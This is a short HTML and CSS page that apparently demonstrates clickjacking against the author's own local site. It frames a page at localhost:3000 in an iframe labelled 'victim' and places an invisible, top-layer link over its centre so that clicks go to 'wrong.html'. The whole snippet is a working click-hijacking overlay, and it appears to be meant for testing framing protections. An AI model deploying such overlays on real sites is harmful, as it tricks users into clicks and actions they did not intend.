<style>
  /* ensure no page margins */
  html,body { margin:0; padding:0; height:100%; }

  /* full-viewport frame wrapper */
  .frameWrap {
    position:relative;
    width:100vw;
    height:100vh;     /* full viewport height */
    overflow:hidden;
    background:#fff;
  }

  /* iframe fills the wrapper */
  iframe#victim {
    width:100%;
    height:100%;
    border:0;
    display:block;
  }

  /* interceptor overlay - size/position with percent coords so you can nudge it */
  .interceptor {
    position:absolute;
    left:50%; top:50%;
    width:260px; height:140px;
    transform:translate(-50%,-50%);
    z-index:9999;
    pointer-events:auto;
    background:rgba(0,0,0,0); /* remove for invisible */
    /*border:3px dashed rgba(255,0,0,0.75);*/
  }
</style>

<div class="frameWrap">
  <!--<div class="note">Demo: clicking the visible Creator card will go to the wrong page</div>-->

  <!-- Show your real site -->
  <iframe id="victim" src="http://localhost:3000/Videos.html"></iframe>

  <!-- Invisible interceptor -->
  <a class="interceptor" href="wrong.html" target="_top" title="Click interceptor"></a>
</div>
